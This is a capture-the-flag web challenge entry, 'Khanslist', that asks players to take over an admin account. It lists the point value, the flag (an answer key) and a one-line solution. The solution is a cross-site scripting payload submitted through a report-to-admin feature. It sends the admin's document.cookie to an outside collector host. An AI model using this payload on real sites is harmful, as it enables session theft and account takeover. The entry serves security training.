# RunCodeWeb

## Name: Khanslist

### Category: Web

### Message:
```
Use/Create your account at <a target="_new" href="https://derp.runcode.ninja">Derp Runcode</a>.<br>
Acquire the admin account.
<br><br>
<a href="https://twitter.com/ohai_ninja" target="_blank">author: @ohai_ninja</a>
```

### Value: 20

### Max Attempts: 0

### Flag: 
```
derp{E451357_xSS_3v3r}
```

### Files:
[docker](xss-site-1)

### Solution:
```
Report to admin feature: <script>document.write('<img src="http://10.YY.XX.2:9000/collect.gif?cookie=' + document.cookie + '" />');</script>
```

